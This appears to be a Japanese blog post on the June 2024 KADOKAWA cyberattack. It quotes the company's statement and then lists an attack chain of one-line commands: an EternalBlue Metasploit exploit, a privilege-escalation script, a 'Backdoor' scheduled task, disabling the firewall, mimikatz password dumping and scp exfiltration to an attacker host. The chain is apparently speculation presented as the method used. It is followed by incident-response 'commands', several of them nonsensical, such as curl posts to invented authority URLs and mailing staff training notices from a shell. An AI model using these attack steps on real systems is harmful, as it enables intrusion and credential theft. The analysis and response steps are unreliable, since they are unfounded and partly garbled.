9日未明、株式会社KADOKAWAは、本社へのサイバー攻撃の被害を受けている旨の声明を発表した。

>2024年6月8日（土）未明に発生したシステム障害により、KADOKAWAグループ ポータルサイト（ https://group.kadokawa.co.jp/ ）をはじめ、当社グループの複数のウェブサイトが利用できない>事象が発生しております。これまでの経緯、現在の状況、今後の対応については、こちらをご覧くだ>さい。

>1.　経緯
　6月8日（土）未明より、当社グループの複数のサーバーにアクセスできない障害が発生しました。この事実を受け、データ保全のため関連するサーバーを至急シャットダウンしました。同日中に社内で分析調査を実施した範囲においては、サイバー攻撃を受けた可能性が高いと認識しております。

>2.　現在の状況
　現在、調査・対応を進めておりますが、現時点で「ニコニコサービス」全般、「KADOKAWAオフィシャルサイト」、「エビテン（ebten）」などで影響が発生していることを確認しております。なお、情報漏洩の有無についても調査を進めております。
https://prtimes.jp/main/html/rd/p/000014844.000007006.html
https://tp.kadokawa.co.jp/

この被害による障害および今後の対応を考察する。

## 攻撃手法
:::details Reconnaissance
```shell
nmap -sV -oN nmap_scan_results.txt <target_IP>
```
:::
source: https://nmap.org/

:::details Exploitation
```shell
msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST <target_IP>; exploit'
```
:::
source: https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/

:::details Privilege Escalation
```shell
powershell -exec bypass -File Invoke-MS16-032.ps1
```
:::
source: https://github.com/PowerShellMafia/PowerSploit

:::details Persistence
```shell
schtasks /create /tn "Backdoor" /tr "cmd.exe /c <payload>" /sc onstart /ru System
```
:::
source: https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks

:::details Defense Evasion
```shell
netsh advfirewall set allprofiles state off
```
:::
source: https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-advfirewall-firewall-context

:::details Credential Access
```shell
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit"
```
:::
source: https://github.com/gentilkiwi/mimikatz

:::details Data Exfiltration
```shell
scp -r /path/to/data user@<attacker_IP>:/destination/path
```
:::
source: https://man.openbsd.org/scp

:::details Command and Control
```shell
python -m SimpleHTTPServer 80
```
:::
source: https://docs.python.org/2/library/simplehttpserver.html


## 障害対応


:::details Initial Response
```shellscript
# Shutdown affected servers to prevent further data breach
shutdown -h now
```
:::

:::details Incident Analysis
```shellscript
# Use forensic tools to analyze affected servers
sudo apt-get install sleuthkit
tsk_recover -a /dev/sdX1 /path/to/recovery_directory
```
:::

:::details Network Isolation
```shellscript
# Isolate compromised servers from network
ifconfig eth0 down
```
:::

:::details Threat Detection
```shellscript
# Scan for malware or unauthorized access
sudo rkhunter --check
```
:::

:::details Data Integrity Verification
```shellscript
# Verify integrity of important files
sha256sum -c checksums.sha256
```
:::

:::details System Cleanup
```shellscript
# Remove potential malware
sudo clamscan -r / --remove
```
:::

:::details Security Patching
```shellscript
# Apply latest security patches
sudo apt-get update
sudo apt-get upgrade
```
:::

:::details User Notification
```shellscript
# Notify users about potential data breach
echo "We have experienced a data breach. Please change your passwords immediately." | mail -s "Data Breach Notification" user@example.com
```
:::

:::details Ongoing Monitoring
```shellscript
# Implement ongoing monitoring for suspicious activities
sudo apt-get install tripwire
tripwire --init
tripwire --check
```
:::

:::details Strengthening Security
```shellscript
# Strengthen security measures (e.g., firewall rules)
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
```
:::

:::details Backup Restoration
```shellscript
# Restore data from backups
rsync -avz /path/to/backup /path/to/restore
```
:::

:::details Log Analysis
```shellscript
# Analyze logs for anomalies
sudo ausearch -m AVC,USER_AVC -ts recent
```
:::

:::details Coordination with Authorities
```shellscript
# Report incident to relevant authorities
curl -X POST -H "Content-Type: application/json" -d '{"incident": "cyber attack"}' https://cybersecurity.authority/report
```
:::

:::details Reviewing Security Policies
```shellscript
# Review and update security policies
vim /etc/security/policies.conf
```
:::

:::details Employee Training
```shellscript
# Conduct cybersecurity training for employees
echo "Mandatory cybersecurity training scheduled for all employees" | mail -s "Cybersecurity Training" employees@company.com
```
:::

:::details Third-party Security Audit
```shellscript
# Hire third-party to conduct security audit
curl -X POST -H "Content-Type: application/json" -d '{"request": "security audit"}' https://security.audit/request
```
:::

:::details Encryption Implementation
```shellscript
# Implement encryption for sensitive data
openssl enc -aes-256-cbc -salt -in /path/to/inputfile -out /path/to/encryptedfile
```
:::

:::details Continuous Improvement
```shellscript
# Establish continuous improvement processes for cybersecurity
sudo apt-get install ossec-hids
ossec-control enable
```
:::

:::details Incident Documentation
```shellscript
# Document incident details for future reference
echo "Cyber attack incident details" > /path/to/documentation.txt
```
:::

